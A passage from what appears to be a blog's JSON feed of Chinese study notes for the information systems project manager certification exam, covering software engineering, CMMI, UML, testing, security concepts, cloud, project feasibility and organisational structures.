tabindex=\"-1\"> 高可用性和高可靠性的规划与设计</h3>\n<p>常见的可用性战术：</p>\n<ul>\n<li>错误检测：用于错误检测的战术包括命令/响应、心跳和异常</li>\n<li>错误恢复：用于错误恢复的战术包括表决、主动冗余、被动冗余</li>\n<li>错误预防：用于错误预防的战术包括出错的组件从服务中删除、引入进程监视器</li>\n</ul>\n<h2 id=\"cmmi-模型\" tabindex=\"-1\"> CMMI 模型</h2>\n<h3 id=\"阶段式模型-过程域的阶段式分组\" tabindex=\"-1\"> 阶段式模型（过程域的阶段式分组）</h3>\n<table>\n<thead>\n<tr>\n<th>成熟度等级</th>\n<th>过程域</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>可管理级</td>\n<td>需求管理、项目计划、配置管理、项目监督与控制、供应商和他管理、质量和分析、过程和产品质量保证</td>\n</tr>\n<tr>\n<td>已定义级</td>\n<td>需求开发、技术解决方案、产品集成、验证、确认、组织 级过程焦点、组织级过程定义、组织级培训、集成项目管理、风险管理、集成化的团队、决策分析和解决方案、组织级集成环境</td>\n</tr>\n<tr>\n<td>量化管理级</td>\n<td>组织级过程性能、定量项目管理</td>\n</tr>\n<tr>\n<td>优化管理级</td>\n<td>组织级改革与实施、因果分析和解决方案</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"连续型模型-连续式模型的过程域分组\" tabindex=\"-1\"> 连续型模型（连续式模型的过程域分组）</h3>\n<table>\n<thead>\n<tr>\n<th>连续式分组</th>\n<th>过程域</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>过程管理</td>\n<td>组织级过程焦点、组织级过程定义、组织级培训、组织级过程性能、组织级改革与实施</td>\n</tr>\n<tr>\n<td>项目管理</td>\n<td>项目计划、项目监督与控制、供应商和他管理、集成项目管理、风险管理、集成化的团队、定量项目管理</td>\n</tr>\n<tr>\n<td>工程</td>\n<td>需求管理、需求开发、技术解决方案、产品集成、验证、确认</td>\n</tr>\n<tr>\n<td>支持</td>\n<td>配置管理、质量和分析、过程和产品质量保证、决策分析和解决方案、组织级集成环境、因果丰兰息和解决方案</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"软件工程\" tabindex=\"-1\"> 软件工程</h2>\n<h3 id=\"系统规划\" tabindex=\"-1\"> 系统规划</h3>\n<ul>\n<li>要从用户的现状出发</li>\n<li>从技术的变革为导向</li>\n<li>从用户的需求为基础</li>\n<li>依据企业的战略目标</li>\n</ul>\n<h3 id=\"软件需求\" tabindex=\"-1\"> 软件需求</h3>\n<ul>\n<li>业务需求：反映企业或客户对系统高层次的目标要求</li>\n<li>用户需求：描述的是用户的具体目标, 或用户要求系统必须能完成的任务</li>\n<li>系统需求：从系统的角度来说明软件的需求, 包括功能需求、非功能需求和设计约束等</li>\n</ul>\n<h3 id=\"需求获取\" tabindex=\"-1\"> 需求获取</h3>\n<p>需求获取是一个确定和理解不同的项目干系人的需求和约束过程。常见的需求获取方法包括用户访谈、问卷调查、采样、情节串联板、联合需求计划等</p>\n<h3 id=\"需求分析\" tabindex=\"-1\"> 需求分析</h3>\n<p>质量功能部署（QFD）将软件需求分为三类：</p>\n<ul>\n<li>常规需求：用户认为系统应该做到的功能或性能</li>\n<li>期望需求：用户想当然认为系统应具备的功能或性能, 但并不能正确描述自己想要得到的这些功能或性能需求</li>\n<li>意外需求：用户要求范围外的功能或性能</li>\n</ul>\n<p>一个好的需求应该具有无二义性、完整性、一致性、可测试性、确定性、可跟踪性、正确性、必要性等特性</p>\n<p>需求开发活动的产物：软件需求规格说明书（SRS）=&gt; 使用国家标准 GB/T 8567-2006, 其中说明书内容包括：</p>\n<ol>\n<li>范围</li>\n<li>引用文件</li>\n<li>需求分析</li>\n<li>合格性规定</li>\n<li>需求可追踪性</li>\n<li>尚未解决的 问题</li>\n<li>注解</li>\n<li>附录</li>\n</ol>\n<p>需求验证也称为需求确认, 在实际工作中, 一般通过需求评审和需求测试工作来需求进行验证。需求评审就是对 SRS 进行技术评审。</p>\n<h3 id=\"uml-统一建模语言\" tabindex=\"-1\"> UML 统一建模语言</h3>\n<p>使用实体联系图（E-R 图）表示数据模型, 用数据流图（DFD）表示功能模型, 用状态转换图（STD）表示行为模型</p>\n<ul>\n<li>五种系统视图</li>\n</ul>\n<p>（1）用例视图\n（2）逻辑视图\n（3）实现视图\n（4）过程视图\n（5）部署视图</p>\n<ul>\n<li>静态图和动态图</li>\n</ul>\n<p>静态图：用例图、类图、对象图、组件图、配置图\n动态图：序列图、状态图、协作图、活动图</p>\n<ul>\n<li>用例图：描述系统的功能, 由系统、用例和角色三种元素组成</li>\n<li>类图：表示系统中的类以及类与类之间的联系, 描述系统的静态结构, 用于逻辑视图中</li>\n<li>对象图：描述一组对象已经它们之间的联系</li>\n<li>状态图：描述对象、子系统、系统的生命周期, 描述一个特定对象的所有可能状态以及由于各种事情的发生而引起的状态之间的转移, 由状态、转移、事件和活动组成</li>\n<li>序列图：也称顺序图, 是一种叫交互图, 由一组对象或参与者以及它们自家可能发生的消息构成</li>\n<li>协作图：描述协作对象之间的交互和连接</li>\n<li>活动图：显示动作以及结果, 描述操作实现中所完成的工作以及用例实例或对象中的活动</li>\n<li>组件图：用来反映代码的物理结构</li>\n</ul>\n<p>UML 用例关系</p>\n<ul>\n<li>关联关系 =&gt; 执行者与用例之间的管理学, 又称通信关系</li>\n<li>泛化关系 =&gt; 执行者之间只有一种关系</li>\n<li>包含关系 =&gt; 多个用例具有一部分相同的行为, 将这部分相同的行为抽取出来与原来的用例形成一个包含关系</li>\n<li>扩展关系 =&gt; 一个用例在执行时可能会使用到一个新的用例</li>\n</ul>\n<h3 id=\"面向对象分析-ooa-、面向对象设计-ood\" tabindex=\"-1\"> 面向对象分析（OOA）、面向对象设计（OOD）</h3>\n<p>OOA（面向对象分析）的任务是“做什么”, OOA（面向对象设计）的任务是“怎么做”</p>\n<p>面向对象分析阶段的核心工作是建立系统的用例模型与分析模型</p>\n<h3 id=\"用例的关系\" tabindex=\"-1\"> 用例的关系</h3>\n<ul>\n<li>包含关系 =&gt; 可以从两个或者两个以上的用例提取公共行为</li>\n<li>扩展关系 =&gt; 根据情况可能发生多种分支</li>\n<li>泛化关系 =&gt; 可以将它们的共性抽象成为父用例</li>\n</ul>\n<h3 id=\"类的关系\" tabindex=\"-1\"> 类的关系</h3>\n<ul>\n<li>关联关系 =&gt; 关联不同类的对象之间的结构关系, 关联体现的对象实例之间的关系, 而不是表示两个类之间的关系</li>\n<li>依赖关系 =&gt; 其中一个类的变化会引起另一个类的变化</li>\n<li>泛化关系 =&gt; 泛化关系描述一般事物与该事物中的特殊种类之间的关系, 也就是父类与子类之间的关系</li>\n<li>共享聚集 (聚合关系) =&gt; 表示类之间的整体与部分的关系</li>\n<li>组合聚集 (组合关系) =&gt; 表示类之间的整体与部分的关系</li>\n<li>实现关系 =&gt; 实现关系将说明和实现联系起来</li>\n</ul>\n<h2 id=\"软件架构\" tabindex=\"-1\"> 软件架构</h2>\n<p>软件架构不仅指定了系统的组织结构和拓扑结构, 并且显示系统需求和构件之间的对应关系, 提供一些设计决策的基本原理</p>\n<p>软件架构设计的核心问题：是能否达到架构级的软件复用</p>\n<p>解决好软件的复用、质量和维护问题, 是研究软件架构的根本目的</p>\n<h3 id=\"软件架构风格\" tabindex=\"-1\"> 软件架构风格</h3>\n<ul>\n<li>数据流风格：包括批处理序列和管道/过滤器两种风格</li>\n<li>调用/返回风格：包括主程序/子程序、数据抽象和面向对象, 以及层次结构</li>\n<li>独立构件风格：包括进程通信和事件驱动的系统</li>\n<li>虚拟机风格：包括解释器和基于规则的系统</li>\n<li>仓库风格：数据库系统、黑板系统和超文本系统</li>\n</ul>\n<h2 id=\"软件设计\" tabindex=\"-1\"> 软件设计</h2>\n<h3 id=\"结构化设计-sd\" tabindex=\"-1\"> 结构化设计（SD）</h3>\n<p>是一个自顶向下、逐步求精和模块化的过程, 分为概要设计和详细设计的两个阶段。</p>\n<p>遵循的基本原则：高内聚、低耦合, 模块间低耦合, 模块内高内聚</p>\n<h3 id=\"面向对象设计-ood\" tabindex=\"-1\"> 面向对象设计（OOD）</h3>\n<p>包含了抽象、封装和可扩展性, 其中可扩展性主要通过继承和朵态实现</p>\n<h2 id=\"软件测试\" tabindex=\"-1\"> 软件测试</h2>\n<h3 id=\"静态测试\" tabindex=\"-1\"> 静态测试</h3>\n<p>指被测试程序不在机器上运行, 而采用人工检测和计算机辅助静态分析的手段对程序进行检测。一般采用桌前检查、代码走查和代码审查</p>\n<h3 id=\"动态测试\" tabindex=\"-1\"> 动态测试</h3>\n<h4 id=\"白盒测试\" tabindex=\"-1\"> 白盒测试</h4>\n<p>也称为结构测试, 主要用于软件的单元测试, 它的主要思想是, 将程序看作一个透明的白盒, 测试人员完全清楚程序的结构和处理算法。</p>\n<h4 id=\"黑盒测试\" tabindex=\"-1\"> 黑盒测试</h4>\n<p>也称为功能测试, 主要用于集成测试、确认测试和系统测试, 它的主要思想是,将程序看作一个不透明的黑盒, 测试人员完全不考虑（或者不了解）程序的内部结构和处理算法</p>\n<h2 id=\"软件测试分类\" tabindex=\"-1\"> 软件测试分类</h2>\n<p>（1）单元测试 =&gt; 测试依据软件详细设计说明书\n（2）集成测试 =&gt; 测试依据软件概要设计说明书\n（3）确认测试 =&gt; 主要用于检测软件的功能、性能、和其他特性是否与用户需求一致\n（1）内部确认测试\n（2）Alpha 测试和 Beta 测试\n（3）验收测试\n（4）系统测试\n（5）配置项测试\n（6）回归测试</p>\n<h2 id=\"软件集成技术\" tabindex=\"-1\"> 软件集成技术</h2>\n<ol>\n<li>表示集成：也称为界面集成, 是黑盒集成, 无须了解程序与数据库的内部构造</li>\n<li>数据集成：是白盒集成</li>\n<li>控制集成</li>\n<li>业务流程集成：也称为过程集成</li>\n<li>企业之间的应用集成</li>\n</ol>\n<p>控制集成与表示集成、数据集成相比, 灵活性更高\n表示集成和数据集成适用的环境下, 都适用于控制集成</p>\n<h2 id=\"物联网\" tabindex=\"-1\"> 物联网</h2>\n<h3 id=\"关键技术\" tabindex=\"-1\"> 关键技术</h3>\n<ul>\n<li>\n<p>传感器技术</p>\n<p>RFID（射频识别）=&gt; 可通过无线电信号识别特点目标并读写相关数据, 而无需识别系统与特定目标之间建立机械或光学接触, 具有远距离读取、高存储容量、成本高、可同时被读取、难复制、可工作于各种恶劣环境等特点</p>\n</li>\n<li>\n<p>嵌入式技术</p>\n<p>综合计算机软硬件、传感器技术、集成电路技术、电子应用技术为一体的复杂技术</p>\n</li>\n</ul>\n<h3 id=\"物联网架构\" tabindex=\"-1\"> 物联网架构</h3>\n<ul>\n<li>应用层 =&gt; 物联网发展的根本目标</li>\n<li>网络层 =&gt; 包括互联网、广电网、网络管理系统和云计算平台等组成, 是整个物联网的中枢</li>\n<li>感知层 =&gt; 由各种传感器构成, 是物联网识别物体、采集信息的来源</li>\n</ul>\n<h2 id=\"云计算服务\" tabindex=\"-1\"> 云计算服务</h2>\n<ul>\n<li>IaaS（基础设施即服务）=&gt; 向用户提供计算机能力、存储空间等基础设施方面的服务</li>\n<li>PaaS（平台即服务）=&gt; 向用户提供虚拟的操作系统、数据库管理系统、Web 应用等平台服务</li>\n<li>SaaS（软件即服务）=&gt; 向用户提供软件（如 CRM、办公软件等）、组件、工作流等虚拟化软件服务, 使软件提供商从软件产品的生产者转变层服务的运营者</li>\n</ul>\n<h2 id=\"大数据的特征\" tabindex=\"-1\"> 大数据的特征</h2>\n<p>（1）大量\n（2）多样\n（3）价值\n（4）高速\n（5）真实性</p>\n<p>大数据从数据源经过分析挖掘到最终获得价值, 包括 5 个环节：数据准备、数据存储与管理、计算处理、数据分析和知识展现。</p>\n<h2 id=\"移动互联网特点\" tabindex=\"-1\"> 移动互联网特点</h2>\n<ul>\n<li>终端移动性</li>\n<li>业务使用的私密性</li>\n<li>终端和网络的局限性</li>\n<li>业务与终端、网络的强关联性</li>\n</ul>\n<h2 id=\"信息安全\" tabindex=\"-1\"> 信息安全</h2>\n<h3 id=\"信息系统安全\" tabindex=\"-1\"> 信息系统安全</h3>\n<ul>\n<li>设备安全\n<ul>\n<li>设备的稳定性 =&gt; 设备在一定时间内不出故障的概率</li>\n<li>设备的可靠性 =&gt; 设备能在一定时间内正常执行任务的概率</li>\n<li>设备的可用性 =&gt; 设备随时可以正常使用的概率</li>\n</ul>\n</li>\n<li>数据安全 =&gt; 静态安全\n<ul>\n<li>秘密性</li>\n<li>可用性</li>\n<li>完整性</li>\n</ul>\n</li>\n<li>内容安全 =&gt; 包括信息内容保密、信息隐私保护等</li>\n<li>行为安全 =&gt; 动态安全</li>\n</ul>\n<h3 id=\"信息安全保护等级\" tabindex=\"-1\"> 信息安全保护等级</h3>\n<ul>\n<li>第一级：会对公民、法人和其他组织的合法权益造成损害, 但不损害国家安全、社会秩序和公共利益</li>\n<li>第二级：会对公民、法人和其他组织的合法权益产生严重损害, 或者对社会秩序和公共利益造成损害, 但不损害国家安全</li>\n<li>第三级：会对社会秩序和公共利益造成严重损害, 或者对国家安全造成损害</li>\n<li>第四级：会对社会秩序和公共利益造成特别严重损害, 或者对国家安全造成严重损害</li>\n<li>第五级：会对国家安全造成特别严重损害</li>\n</ul>\n<h3 id=\"计算机系统安全保护能力等级\" tabindex=\"-1\"> 计算机系统安全保护能力等级</h3>\n<ul>\n<li>第一级：用户自主保护级</li>\n<li>第二级：系统审计保护级</li>\n<li>第三级：安全标记保护级</li>\n<li>第四级：结构化保护级</li>\n<li>第五级：访问验证保护级</li>\n</ul>\n<h3 id=\"信息加密\" tabindex=\"-1\"> 信息加密</h3>\n<h4 id=\"对称加密技术\" tabindex=\"-1\"> 对称加密技术</h4>\n<p>加密和解密使用相同的密钥</p>\n<p>典型算法：数据加密标准（DES）、国际数据加密算法（IDEA）、数据加密标准算法（AES）</p>\n<h4 id=\"非对称加密\" tabindex=\"-1\"> 非对称加密</h4>\n<p>加密用“公钥”, 解密用“私钥”</p>\n<p>典型算法：RSA、ECC</p>\n<h4 id=\"hash-函数\" tabindex=\"-1\"> Hash 函数</h4>\n<p>Hash 函数可提供保密性、豹纹认证以及数字签名功能</p>\n<h4 id=\"数字签名\" tabindex=\"-1\"> 数字签名</h4>\n<p>是证明当事者身份和数据真实性的一种信息。它采用非对称加密钥加密技术与数字摘要技术的应用。</p>\n<h3 id=\"信息系统安全-1\" tabindex=\"-1\"> 信息系统安全</h3>\n<ul>\n<li>计算机设备安全\n<ul>\n<li>物理安全</li>\n<li>设备安全</li>\n<li>存储介质安全</li>\n<li>可靠性技术</li>\n</ul>\n</li>\n<li>网络安全\n<ul>\n<li>防火墙\n<ul>\n<li>阻挡对网络的非法访问和不安全数据的传递, 使本地系统和网络免于收到许多网络安全威胁</li>\n</ul>\n</li>\n<li>入侵检测系统（IDS）\n<ul>\n<li>注重对网络安全状况的监管, 通过监视网络或系统资源, 寻找违反安全策略的行为或攻击迹象, 并发出报警</li>\n</ul>\n</li>\n<li>入侵防护系统（IPS）\n<ul>\n<li>倾向提供主动防护, 注重对入侵行为的控制</li>\n</ul>\n</li>\n<li>虚拟专用网络（VPN）</li>\n<li>安全扫描</li>\n<li>网络蜜罐技术\n<ul>\n<li>是一种制定防御技术, 是入侵检测技术的一个重要发展方向</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>操作系统安全\n<ul>\n<li>切断（可用性的威胁）</li>\n<li>截取（机密性的威胁）</li>\n<li>篡改（完整性的攻击）</li>\n<li>伪造（合法性的威胁）</li>\n</ul>\n</li>\n<li>数据库安全</li>\n<li>应用系统安全\n<ul>\n<li>Web 访问控技术</li>\n<li>单点登录（SSD）技术</li>\n<li>网页防篡改技术</li>\n<li>Web 内容安全</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"电子政务\" tabindex=\"-1\"> 电子政务</h2>\n<ul>\n<li>政府对政务（G2G）</li>\n<li>政府对企业（G2B）</li>\n<li>政府对公众（G2C）</li>\n<li>政府对公务员（G2E）</li>\n</ul>\n<h2 id=\"电子商务\" tabindex=\"-1\"> 电子商务</h2>\n<ul>\n<li>企业与企业之间的电子商务（B2B）=&gt; 阿里巴巴（1688）</li>\n<li>企业与消费者之间的电子上礼物（B2C）=&gt; 京东、当当、苏宁</li>\n<li>消费者与消费者之间的电子商务（C2C）=&gt; 淘宝、易趣、闲鱼</li>\n<li>线上购买线下的商品和服务（O2O）=&gt; 淘票票、美团、饿了么</li>\n</ul>\n<h2 id=\"企业系统规划-bsp\" tabindex=\"-1\"> 企业系统规划（BSP）</h2>\n<p>（1）准备工作\n（2）定义企业过程\n（3）识别定义数据类\n（4）分析现有系统\n（5）确定管理部门对系统的要求\n（6）制定建议书和开发计划\n（7）成功报告</p>\n<h2 id=\"信息系统的规划工具\" tabindex=\"-1\"> 信息系统的规划工具</h2>\n<p>信息系统规划（ISP）是从企业战略出发, 构建企业基本的信息系统架构, 利用信息系统管理企业行为, 辅助企业进行决策。</p>\n<ul>\n<li>制定计划时 =&gt; PERT 图和甘特图</li>\n<li>访谈 =&gt; 调查表和调查提纲</li>\n<li>确定需求 =&gt; 会谈和正式会议</li>\n<li>企业组织结构与企业过程联系 =&gt; 过程/组织（P/O）矩阵</li>\n<li>采用实体法归纳出数据类 =&gt; 资源/数据（R/D）矩阵</li>\n<li>分析过程的输入数据类和输出数据类, 归纳出系统的数据类 =&gt; 输入-处理-输出（IPO）矩阵</li>\n<li>以企业过程为行, 以数据为列 =&gt; CU 矩阵</li>\n</ul>\n<h2 id=\"智慧城市建设参考模型\" tabindex=\"-1\"> 智慧城市建设参考模型</h2>\n<p>（1）物联感知层\n（2）通信感知层\n（3）计算与存储层\n（4）数据及服务支撑层\n（5）智慧应用层</p>\n<h2 id=\"互联网\" tabindex=\"-1\"> “互联网+”</h2>\n<p>“互联网+”简单的说就是“互联网+传统行业”</p>\n<p>“互联网+”的六大特征：</p>\n<p>（1）跨界融合\n（2）创新驱动\n（3）重塑结构\n（4）尊重人性\n（5）开发生态\n（6）连接一切</p>\n<h2 id=\"区块链\" tabindex=\"-1\"> 区块链</h2>\n<p>区块链是分布式数据存储、点对点传输、共识机制、加密算法等计算机技术的新型应用模式。</p>\n<p>区块链的特征：</p>\n<p>（1）去中心化\n（2）开放性\n（3）自治性\n（4）信息不可篡改性\n（5）匿名性</p>\n<h2 id=\"元宇宙\" tabindex=\"-1\"> 元宇宙</h2>\n<p>元宇宙是一种沉浸式体验, 可以完成很高级的感知和交互, 但其本质仍然是构建在程序之上的虚拟世界</p>\n<p>核心技术：</p>\n<p>（1）物联网技术\n（2）区块链技术\n（3）交互技术\n（4）电子游戏技术\n（5）人工智能技术\n（6）网络及运算技术</p>\n",
      "date_published": "2022-07-02T14:22:42.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "信息系统项目管理师"
      ]
    },
    {
      "title": "第三章：项目立项管理",
      "url": "https://vxhly.github.io/soft-test/knowledge/project-approval.html",
      "id": "https://vxhly.github.io/soft-test/knowledge/project-approval.html",
      "summary": "前言\n记录项目立项管理章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录项目立项管理章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"项目立项\" tabindex=\"-1\"> 项目立项</h2>\n<p>项目立项一般包括提交项目建议书、项目可行性研究、项目招标与投标等内容。</p>\n<h3 id=\"项目建议书\" tabindex=\"-1\"> 项目建议书</h3>\n<p>核心内容包括：</p>\n<p>（1）项目的必要性\n（2）项目的市场预测\n（3）产品方案或服务的市场预测\n（4）项目建设必需的条件</p>\n<h3 id=\"项目可行性研究报告\" tabindex=\"-1\"> 项目可行性研究报告</h3>\n<p>可行性研究的内容：</p>\n<ul>\n<li>投资必要性</li>\n<li>技术可行性分析 =&gt; 需要考虑的因素\n<ul>\n<li>进行项目开发的风险</li>\n<li>人力资源的有效性</li>\n<li>技术能力的可能性</li>\n<li>物质（产品的可用性）</li>\n</ul>\n</li>\n<li>财务可行性</li>\n<li>组织可行性</li>\n<li>经济可行性 =&gt; 支出分析、收益分析、投资回报分析以及敏感性分析, 包含对项目的的社会效益分析</li>\n<li>社会可行性</li>\n<li>风险因素及对策</li>\n</ul>\n<p>可行性研究分为初步可行性研究、详细可行性研究、可行性研究报告三个基本阶段, 步骤：</p>\n<ol>\n<li>确定项目规模和目标</li>\n<li>研究正在运行的系统</li>\n<li>建立新系统的逻辑模型</li>\n<li>导出和评价各种方案</li>\n<li>推荐可行性方案</li>\n<li>编写可行性研究报告</li>\n<li>递交可行性研究报告</li>\n</ol>\n<h2 id=\"可行性研究\" tabindex=\"-1\"> 可行性研究</h2>\n<p>机会研究、初步可行性研究、详细可行性研究、评估与决策是投资前期四个阶段。其中前三个可以进行合并, 但是详细可行性研究是不可或缺的。可以进行省略的阶段有机会研究、初步可行性研究。</p>\n<h3 id=\"初步可行性研究\" tabindex=\"-1\"> 初步可行性研究</h3>\n<p>初步可行性研究一般是在对市场或者客户情况进行调查后, 对项目进行的初步评估</p>\n<h3 id=\"详细可行性研究\" tabindex=\"-1\"> 详细可行性研究</h3>\n<p>需要对项目在技术、经济、社会、运行环境、法律等方面进行深入的调查研究和分析, 是一项费时、费力的工作, 特别是大型的或比较复杂的项目更是如此</p>\n<p>详细可行性研究的基本原则</p>\n<p>（1）科学性原则\n（2）客观性原则\n（3）公正性原则</p>\n<p>详细可行性研究的内容</p>\n<p>（1）概述\n（2）需求确定\n（3）现有资源、设施情况分析\n（4）设计（初步）技术方案\n（5）项目实施进度计划建议\n（6）投资估算和资金筹措计划\n（7）项目组织、人力资源、技术培训计划\n（8）经济和社会效益分析\n（9）合作/协作方式</p>\n<p>开发总成本一般划分为四大类：研发成本、行政管理费、销售与分销费用、财务费用和折旧, 前三类成本的总和称为经营成本</p>\n<h2 id=\"项目评估与论证\" tabindex=\"-1\"> 项目评估与论证</h2>\n<p>“先论证, 后评估”是现代项目管理的基本原则。</p>\n<h3 id=\"项目论证\" tabindex=\"-1\"> 项目论证</h3>\n<p>项目论证是一个连续的过程, 应该围绕着市场需求、开发技术、财务经济三个方面展开调查和分析, 市场是前提、技术是手段、财务经济是核心</p>\n<p>项目论证一般分为机会研究、初步可行性研究和详细可行性研究三个阶段</p>\n<p>项目论证步骤</p>\n<ol>\n<li>明确项目范围和业主目标</li>\n<li>收集并分析相关资料</li>\n<li>拟定多种可行的能够相互替代的实施方案</li>\n<li>多方案分析、比较</li>\n<li>选择最优方案进一步详细全面地论证</li>\n<li>编制项目论证报告、环境影响报告书和采购方式审批报告</li>\n<li>编制资金筹措计划和项目实施进度计划</li>\n</ol>\n<h3 id=\"项目评估\" tabindex=\"-1\"> 项目评估</h3>\n<p>输出文件：项目评估报告</p>\n<p>项目评估的依据：</p>\n<ol>\n<li>项目建议书及其批准文件</li>\n<li>项目可行性研究报告</li>\n<li>报送单位的申请报告及主管部门的初审意见</li>\n<li>有关资源、配件、燃料、水、电、交通、通信、资金（包括外汇）等方面的协议文件</li>\n<li>必需的其他文件和资料</li>\n</ol>\n<p>项目评估工作</p>\n<ol>\n<li>成立评估小组, 进行分工、制定评估 工作计划</li>\n<li>开展调查研究, 收集数据资料, 并对可行性研究报告和相关资料进行审查和分析</li>\n<li>分析与评估</li>\n<li>编写评估报告</li>\n<li>讨论、修改报告</li>\n<li>专家论证会</li>\n<li>评估报告定稿</li>\n</ol>\n",
      "date_published": "2022-07-13T20:22:32.000Z",
      "date_modified": "2022-08-30T01:41:28.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "信息系统项目管理师"
      ]
    },
    {
      "title": "第二章：信息系统项目管理基础",
      "url": "https://vxhly.github.io/soft-test/knowledge/project-management.html",
      "id": "https://vxhly.github.io/soft-test/knowledge/project-management.html",
      "summary": "前言\n记录信息系统项目管理基础章节的相关知识、频繁考点。\n\n",
      "content_html": "<div><p>前言</p>\n<p>记录信息系统项目管理基础章节的相关知识、频繁考点。</p>\n</div>\n\n<h2 id=\"信息系统项目基础\" tabindex=\"-1\"> 信息系统项目基础</h2>\n<h3 id=\"项目的概念\" tabindex=\"-1\"> 项目的概念</h3>\n<p>项目是为提供一项独特产品、服务或成果所做的临时性努力。</p>\n<h3 id=\"项目的特点\" tabindex=\"-1\"> 项目的特点</h3>\n<p>（1）临时性（一次性）\n（2）独特的产品、服务或成果\n（3）逐步完善\n（4）资源约束\n（5）目的性</p>\n<h3 id=\"项目工作的主要目标\" tabindex=\"-1\"> 项目工作的主要目标</h3>\n<p>时间、成本、质量、范围</p>\n<p>项目经理的责任就是在四个要素之间进行权衡以保证项目成功</p>\n<h3 id=\"项目于日常运作的区别\" tabindex=\"-1\"> 项目于日常运作的区别</h3>\n<table>\n<thead>\n<tr>\n<th>不同点</th>\n<th>项目</th>\n<th>日常运作</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>目的</td>\n<td>独特的</td>\n<td>常规的、普通的</td>\n</tr>\n<tr>\n<td>责任人</td>\n<td>项目经理</td>\n<td>部门经理</td>\n</tr>\n<tr>\n<td>持续时间</td>\n<td>有限的</td>\n<td>相对无限的</td>\n</tr>\n<tr>\n<td>持续性</td>\n<td>一次性</td>\n<td>重复性</td>\n</tr>\n<tr>\n<td>组织结构</td>\n<td>项目组织</td>\n<td>职能部门</td>\n</tr>\n<tr>\n<td>考核指标</td>\n<td>以目标为导向</td>\n<td>效率和有效性</td>\n</tr>\n<tr>\n<td>资源需求</td>\n<td>多变性</td>\n<td>稳定性</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"信息系统项目的特点\" tabindex=\"-1\"> 信息系统项目的特点</h3>\n<ul>\n<li>目标不明确</li>\n<li>需求变化频繁</li>\n<li>智力密集型</li>\n<li>队伍庞大</li>\n<li>设计人员高度专业化</li>\n<li>涉及的承包商多</li>\n<li>各级承包商分布在个地, 相互联系复杂</li>\n<li>系统集成项目中需研制开发大量的软硬件系统</li>\n<li>项目生命期通常较短</li>\n<li>通常要采用大量的新技术</li>\n<li>使用与维护的要求非常复杂</li>\n</ul>\n<h3 id=\"软技能\" tabindex=\"-1\"> 软技能</h3>\n<ul>\n<li>有效的沟通：信息交流</li>\n<li>影响一个组织：“让事情办成”的能力</li>\n<li>领导能力：形成一个前景和战略并组织人员达到它</li>\n<li>激励：激励人员达到高水平的生成率并克服变革的阻力</li>\n<li>谈判和冲突管理：与其他人谈判或达成协议</li>\n<li>问题解决：问题定义和做出决策的结合</li>\n</ul>\n<h2 id=\"项目的组织结构\" tabindex=\"-1\"> 项目的组织结构</h2>\n<h3 id=\"职能型组织\" tabindex=\"-1\"> 职能型组织</h3>\n<table>\n<thead>\n<tr>\n<th>项目属性</th>\n<th>特征</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>项目经理权利</td>\n<td>很小或没有</td>\n</tr>\n<tr>\n<td>项目经理角色</td>\n<td>兼职</td>\n</tr>\n<tr>\n<td>预算控制者</td>\n<td>职能部门经理</td>\n</tr>\n<tr>\n<td>项目管理行政人员（文员、资料员等）</td>\n<td>兼职</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"/assets/zhi-neng-xing.png\" alt=\"职能型组织\"></p>\n<h4 id=\"特点\" tabindex=\"-1\"> 特点</h4>\n<ul>\n<li>兼职项目经理（联络员）</li>\n<li>权力大小：“很小“或者”没有</li>\n<li>职业路径清晰、横向联系薄弱</li>\n</ul>\n<h4 id=\"优点\" tabindex=\"-1\"> 优点</h4>\n<ul>\n<li>资源利用率相对较高</li>\n<li>成员工作稳定</li>\n</ul>\n<h4 id=\"缺点\" tabindex=\"-1\"> 缺点</h4>\n<ul>\n<li>职能型组织管理职能多, 目标多样</li>\n<li>部门间沟通、协调难度大</li>\n<li>为项目分配的资源不稳定</li>\n<li>决策慢</li>\n</ul>\n<h3 id=\"项目型组织\" tabindex=\"-1\"> 项目型组织</h3>\n<table>\n<thead>\n<tr>\n<th>项目属性</th>\n<th>特征</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>项目经理权利</td>\n<td>大到全权</td>\n</tr>\n<tr>\n<td>项目经理角色</td>\n<td>全职</td>\n</tr>\n<tr>\n<td>预算控制者</td>\n<td>项目经理</td>\n</tr>\n<tr>\n<td>项目管理行政人员（文员、资料员等）</td>\n<td>全职</td>\n</tr>\n</tbody>\n</table>\n<p><img src=\"/assets/xiang-mu-xing.png\" alt=\"项目型组织\"></p>\n<h4 id=\"特点-1\" tabindex=\"-1\"> 特点</h4>\n<ul>\n<li>全职项目经理</li>\n<li>权力大小：“大”甚至“全部”</li>\n<li>项目经理控制度高</li>\n<li>重复配置；项目成员无家可归</li>\n</ul>\n<h4 id=\"优点-1\" tabindex=\"-1\"> 优点</h4>\n<ul>\n<li>结构单一、责任分明, 有利于统一指挥</li>\n<li>目标明确单一</li>\n<li>沟通简洁、方便</li>\n<li>决策快</li>\n</ul>\n<h4 id=\"缺点-1\" tabindex=\"-1\"> 缺点</h4>\n<ul>\n<li>管理成本过高, 如项目的工作量不足则只有配置效率低</li>\n<li>项目环境比较封闭, 不利于沟通、技术知识等共享</li>\n<li>员工缺乏事业上的连续性和保障（相对而言）</li>\n</ul>\n<h3 id=\"矩阵型组织\" tabindex=\"-1\"> 